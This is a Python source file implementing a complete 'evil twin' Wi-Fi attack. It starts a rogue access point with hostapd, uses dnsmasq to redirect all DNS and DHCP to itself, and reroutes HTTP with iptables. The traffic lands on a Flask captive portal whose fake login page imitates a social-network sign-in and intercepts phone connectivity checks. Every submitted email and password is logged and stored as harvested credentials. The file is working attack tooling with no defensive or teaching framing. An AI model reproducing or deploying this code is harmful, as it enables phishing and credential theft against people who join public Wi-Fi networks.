import os
import subprocess
import time
import threading
import logging
from typing import Optional, Dict, List
from flask import Flask, request, render_template_string

logger = logging.getLogger("EvilTwin")

PORTAL_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 350px; }
        h2 { color: #1c1e21; margin-bottom: 1.5rem; text-align: center; }
        input { width: 100%; padding: 12px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .footer { margin-top: 1rem; font-size: 0.8rem; color: #65676b; text-align: center; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Network Login</h2>
        <p style="font-size: 0.9rem; color: #606770; margin-bottom: 1.5rem;">Please sign in to access the internet.</p>
        <form action="/login" method="post">
            <input type="text" name="email" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">Connect to free WiFi. Secure and fast.</div>
    </div>
</body>
</html>
"""

class EvilTwin:
    """
    Advanced Evil Twin Attack Engine
    - Rogue Access Point (hostapd)
    - DHCP/DNS Hijacking (dnsmasq)
    - Captive Portal (Flask)
    - Credential Harvesting
    """
    
    def __init__(self, interface: str = "wlan0mon"):
        self.interface = interface
        self.ssid = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.portal_thread = None
        self.running = False
        self.harvested_creds = []
        
        # Portal App
        self.app = Flask(__name__)
        self._setup_portal()
        
    def _setup_portal(self):
        @self.app.route('/')
        @self.app.route('/generate_204') # Android captive portal check
        @self.app.route('/hotspot-detect.html') # Apple captive portal check
        def portal():
            return render_template_string(PORTAL_HTML)
            
        @self.app.route('/login', methods=['post'])
        def login():
            email = request.form.get('email')
            password = request.form.get('password')
            creds = {'email': email, 'password': password, 'ts': time.time()}
            self.harvested_creds.append(creds)
            logger.info(f"🚨 HARVESTED: {email} / {password}")
            return "<h2>Success</h2><p>Authentication successful. You will be redirected shortly.</p>"

        # Generic redirect for DNS hijacking
        @self.app.errorhandler(404)
        def redirect_to_portal(e):
            return render_template_string(PORTAL_HTML)

    def start(self, ssid: str, channel: int = 6, interface: str = None):
        """Start the complete Evil Twin stack"""
        if interface:
            self.interface = interface
            
        if self.running:
            self.stop()
            
        self.ssid = ssid
        logger.info(f"Starting Evil Twin: {ssid} on {self.interface}")
        
        # 1. Setup Interface IP
        subprocess.run(["sudo", "ifconfig", self.interface, "10.0.0.1", "netmask", "255.255.255.0", "up"])
        
        # 2. Start Portal Web Server
        self.portal_thread = threading.Thread(target=lambda: self.app.run(host='0.0.0.0', port=80, threaded=True), daemon=True)
        self.portal_thread.start()
        
        # 3. Configure and Start hostapd
        self._start_hostapd(ssid, channel)
        
        # 4. Configure and Start dnsmasq
        self._start_dnsmasq()
        
        # 5. Setup Routing (iptables)
        self._setup_iptables()
        
        self.running = True
        return True

    def _start_hostapd(self, ssid, channel):
        conf = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
        with open("/tmp/hostapd_evil.conf", "w") as f:
            f.write(conf)
        
        self.hostapd_proc = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"], 
                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _start_dnsmasq(self):
        conf = f"""interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
        with open("/tmp/dnsmasq_evil.conf", "w") as f:
            f.write(conf)
            
        self.dnsmasq_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _setup_iptables(self):
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"])

    def stop(self):
        """Stop all processes and cleanup"""
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            
        subprocess.run(["sudo", "pkill", "hostapd"], check=False)
        subprocess.run(["sudo", "pkill", "dnsmasq"], check=False)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=False)
        
        self.running = False
        logger.info("Evil Twin stopped.")

    def get_status(self):
        return {
            "running": self.running,
            "ssid": self.ssid,
            "clients_count": self._get_client_count(),
            "creds_count": len(self.harvested_creds),
            "creds": self.harvested_creds[-5:] # Last 5
        }

    def _get_client_count(self) -> int:
        # Simple count from dnsmasq leases if possible
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
                return len(f.readlines())
        except:
            return 0
